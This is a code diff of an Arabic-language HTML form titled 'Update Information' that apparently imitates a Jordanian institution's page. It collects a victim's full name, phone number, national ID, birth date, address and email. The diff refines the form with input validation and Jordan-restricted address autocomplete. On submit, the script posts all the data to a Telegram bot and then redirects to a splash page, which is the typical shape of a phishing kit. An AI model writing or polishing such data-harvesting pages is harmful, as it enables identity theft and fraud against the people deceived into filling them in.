@@ -5,176 +5,168 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>تحديث المعلومات</title>
 <style>
-body {
-font-family: Arial, sans-serif;
-margin: 0;
-padding: 0;
-direction: rtl;
-background: #fff;
-color: #000;
-}
+:root{ --accent:#ff5a00; --bar:#2b2e36; }
+html,body{height:100%;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#000;}
 /* البار العلوي */
-.top-bar {
-background: #2b2e36; /* نفس الدرجة الظاهرة بالصورة */
-color: #fff;
-padding: 15px;
-font-size: 18px;
-text-align: center;
-position: relative;
-}
-.top-bar::after {
-content: "";
-display: block;
-height: 3px;
-background: #ff5a00; /* البرتقالي */
-position: absolute;
-bottom: 0;
-left: 0;
-right: 0;
-}
-.back-btn {
-position: absolute;
-right: 10px;
-top: 50%;
-transform: translateY(-50%);
-font-size: 22px;
-color: #fff;
-text-decoration: none;
-}
-.container {
-padding: 20px;
-}
-h2 {
-text-align: center;
-margin: 25px 0;
-font-size: 22px;
-}
-label {
-display: block;
-margin: 10px 0 5px;
-font-size: 15px;
-}
-input {
-width: 100%;
-padding: 12px;
-margin-bottom: 15px;
-border: none;
-border-bottom: 1px solid #ccc;
-font-size: 16px;
-outline: none;
-}
-.btn {
-width: 100%;
-padding: 18px;
-background: #ff5a00;
-border: none;
-color: #fff;
-font-size: 18px;
-position: fixed;
-bottom: 0;
-left: 0;
-cursor: not-allowed;
-}
-.btn.active {
-cursor: pointer;
-background: #e44a00;
-}
+.top-bar{background:var(--bar);color:#fff;padding:14px 48px;text-align:center;position:relative;}
+.top-bar::after{content:"";display:block;height:3px;background:var(--accent);position:absolute;bottom:0;left:0;right:0}
+.back-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:22px;color:#fff;text-decoration:none;}
+.container{max-width:720px;margin:0 auto;padding:20px 16px 100px;box-sizing:border-box}
+h2{text-align:center;margin:18px 0;font-size:20px}
+label{display:block;margin:12px 0 6px;font-size:15px}
+.input-row{display:flex;gap:12px;flex-wrap:wrap}
+input[type="text"],input[type="tel"],input[type="email"],input[type="date"]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box}
+/* زر ثابت في الأسفل مع مساحة داخلية للصفحة */
+.btn{width:calc(100% - 32px);max-width:720px;padding:14px;border:none;border-radius:10px;background:var(--accent);color:#fff;font-size:18px;position:fixed;left:50%;transform:translateX(-50%);bottom:18px;cursor:not-allowed;box-shadow:0 12px 30px rgba(0,0,0,0.12)}
+.btn.active{cursor:pointer;background:#e44a00}
+.suggest-note{font-size:13px;color:#666;margin-top:6px}
+.form-row{margin-bottom:6px}
+/* responsive */
+@media (max-width:520px){.container{padding:12px 12px 120px}.top-bar{padding:12px 40px}.back-btn{font-size:20px}}
 </style>
 </head>
 <body>
-
 <div class="top-bar">
 تحديث المعلومات
-<a href="verethad.html" class="back-btn">➔</a>
+<a class="back-btn" href="verethad.html">‹</a>
 </div>
 
 <div class="container">
-<h2>أدخل المعلومات</h2>
-<form id="infoForm">
-<label>الاسم بالكامل</label>
-<input type="text" id="name" placeholder="أدخل الاسم بالكامل" required>
+  <h2>أدخل المعلومات</h2>
+  <form id="infoForm" autocomplete="on">
+    <div class="form-row">
+      <label for="name">الاسم بالكامل</label>
+      <input type="text" id="name" placeholder="أدخل الاسم بالكامل" required>
+    </div>
 
-<label>رقم الهاتف</label>
-<input type="tel" id="phone" placeholder="أدخل رقم الهاتف" required>
+    <div class="form-row">
+      <label for="phone">رقم الهاتف</label>
+      <input type="tel" id="phone" placeholder="أدخل رقم الهاتف" inputmode="tel" required>
+    </div>
 
-<label>الرقم الوطني</label>
-<input type="text" id="nationalId" placeholder="أدخل الرقم الوطني" required>
+    <div class="form-row">
+      <label for="nationalId">الرقم الوطني</label>
+      <!-- نسمح بالأرقام فقط ونحدد طول أقصى 10 (يمكن تغييره) -->
+      <input type="text" id="nationalId" placeholder="أدخل الرقم الوطني" inputmode="numeric" maxlength="10" required>
+      
+    </div>
 
-<label>تاريخ الميلاد</label>
-<input type="date" id="dob" required>
+    <div class="form-row">
+      <label for="dob">تاريخ الميلاد</label>
+      <input type="date" id="dob" required>
+      <div id="dobFormatted" class="suggest-note"></div>
+    </div>
 
-<label>العنوان</label>
-<input type="text" id="address" placeholder="أدخل العنوان" required>
+    <div class="form-row">
+      <label for="address">العنوان</label>
+      <input type="text" id="address" placeholder="ابحث عن عنوانك (اقتراحات من جوجل - الأردن)" autocomplete="street-address" required>
+      
+    </div>
 
-<label>البريد الإلكتروني</label>
-<input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>
+    <div class="form-row">
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>
+    </div>
 
-<button type="submit" id="submitBtn" class="btn">التالي</button>
-</form>
+    <button type="submit" id="submitBtn" class="btn">التالي</button>
+  </form>
 </div>
 
+<!-- تحميل Google Places API (استبدل YOUR_GOOGLE_API_KEY بمفتاحك) -->
+<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_API_KEY&libraries=places&region=JO&language=ar&callback=initAutocomplete" async defer></script>
+
 <script>
+// عناصر ونقطة إدخال
 const form = document.getElementById('infoForm');
 const btn = document.getElementById('submitBtn');
-const inputs = form.querySelectorAll('input');
+const inputs = Array.from(form.querySelectorAll('input'));
+const nationalId = document.getElementById('nationalId');
+const dob = document.getElementById('dob');
+const dobFormatted = document.getElementById('dobFormatted');
+const addressInput = document.getElementById('address');
 
 // تفعيل زر التالي بعد تعبئة جميع الحقول
-inputs.forEach(input => {
-input.addEventListener('input', () => {
-let allFilled = true;
-inputs.forEach(i => {
-if (!i.value) allFilled = false;
-});
-if (allFilled) {
-btn.classList.add('active');
-btn.removeAttribute('disabled');
-btn.style.cursor = "pointer";
-} else {
-btn.classList.remove('active');
-btn.setAttribute('disabled', true);
-btn.style.cursor = "not-allowed";
+function updateButtonState(){
+  const allFilled = inputs.every(i => i.value.trim() !== '');
+  if(allFilled){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
+  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
 }
-});
-});
+inputs.forEach(i => i.addEventListener('input', updateButtonState));
 
-// إرسال البيانات إلى تلجرام
+// جعل الرقم الوطني أرقام فقط (منع الأحرف) + لصق
+nationalId.addEventListener('keydown', (e) => {
+  const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
+  if (allowed.includes(e.key)) return;
+  if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault();
+});
+nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/\D/g,''); updateButtonState(); });
+nationalId.addEventListener('paste', (e)=>{ e.preventDefault(); const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,''); nationalId.value = paste.slice(0, nationalId.maxLength); updateButtonState(); });
+
+// عند اختيار تاريخ الميلاد نعرضه بصيغة YYYY/MM/DD كما طلبت
+function formatDateToYMD(value){ if(!value) return ''; const d = new Date(value); if (Number.isNaN(d.getTime())) return ''; const yyyy = d.getFullYear(); const mm = String(d.getMonth()+1).padStart(2,'0'); const dd = String(d.getDate()).padStart(2,'0'); return `${yyyy}/${mm}/${dd}`; }
+dob.addEventListener('change', ()=>{ const f = formatDateToYMD(dob.value); dobFormatted.textContent = f ? `المُدخل: ${f}` : ''; updateButtonState(); });
+
+// Google Places Autocomplete - مقيدة للأردن
+function initAutocomplete(){
+  if (!window.google || !google.maps) return;
+  const ac = new google.maps.places.Autocomplete(addressInput, { componentRestrictions: { country: 'jo' }, fields: ['formatted_address','address_components','geometry'], types: ['address'] });
+  ac.addListener('place_changed', () => {
+    const place = ac.getPlace();
+    // نضع العنوان المُنسق في الحقل
+    if(place && place.formatted_address) addressInput.value = place.formatted_address;
+    updateButtonState();
+  });
+}
+
+// إرسال البيانات إلى تلجرام ثم تحويل إلى splash1.html
+const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
+const CHAT_ID = 'ضع_ChatID_هنا';
 form.addEventListener('submit', function(e){
-e.preventDefault();
+  e.preventDefault();
+  // تأكد أن الزر مفعل
+  if(btn.disabled) return;
 
-const data = {
-name: document.getElementById('name').value,
-phone: document.getElementById('phone').value,
-nationalId: document.getElementById('nationalId').value,
-dob: document.getElementById('dob').value,
-address: document.getElementById('address').value,
-email: document.getElementById('email').value
-};
+  const data = {
+    name: document.getElementById('name').value.trim(),
+    phone: document.getElementById('phone').value.trim(),
+    nationalId: nationalId.value.trim(),
+    dob: formatDateToYMD(dob.value),
+    address: addressInput.value.trim(),
+    email: document.getElementById('email').value.trim()
+  };
 
-const botToken = "ضع_توكن_البوت_هنا";
-const chatId = "ضع_ChatID_هنا";
-const text =
-`📋 تحديث المعلومات:\n` +
-`👤 الاسم: ${data.name}\n` +
-`📞 الهاتف: ${data.phone}\n` +
-`🆔 الرقم الوطني: ${data.nationalId}\n` +
-`🎂 تاريخ الميلاد: ${data.dob}\n` +
-`🏠 العنوان: ${data.address}\n` +
-`📧 البريد الإلكتروني: ${data.email}`;
+  const text = `📋 تحديث المعلومات:\n👤 الاسم: ${data.name}\n📞 الهاتف: ${data.phone}\n🆔 الرقم الوطني: ${data.nationalId}\n🎂 تاريخ الميلاد: ${data.dob}\n🏠 العنوان: ${data.address}\n📧 البريد الإلكتروني: ${data.email}`;
 
-fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-method: "POST",
-headers: {"Content-Type": "application/json"},
-body: JSON.stringify({
-chat_id: chatId,
-text: text
-})
-}).then(res => {
-alert("تم إرسال المعلومات بنجاح ✅");
-}).catch(err => {
-alert("حدث خطأ في الإرسال ❌");
+  // تحقق من إعدادات التلجرام
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_توكن') || !CHAT_ID || CHAT_ID.includes('ضع_ChatID')){
+    alert('تنبيه: لم تقم بإضافة بيانات بوت التلجرام في الكود. سيتم عرض النتيجة محليًا.');
+    console.log('payload ->', text);
+    // تحويل تجريبي
+    window.location.href = 'splash1.html';
+    return;
+  }
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  })
+  .then(res => res.json())
+  .then(resp => {
+    if(resp && resp.ok){
+      // إرسال ناجح -> تحويل المستخدم
+      window.location.href = 'splash1.html';
+    } else {
+      alert('حدث خطأ في إرسال البيانات إلى تلجرام.');
+      console.error('telegram response', resp);
+    }
+  })
+  .catch(err => { alert('حدث خطأ في الإرسال'); console.error(err); });
 });
-});
+
+// انفرجية: تأكد من تحديث حالة الزر عند تحميل الصفحة
+updateButtonState();
+
+// ملاحظة: يجب استبدال YOUR_GOOGLE_API_KEY و BOT_TOKEN و CHAT_ID بالقيم الحقيقية لضمان عمل الاقتراحات والإرسال.
 </script>
-
 </body>
 </html>
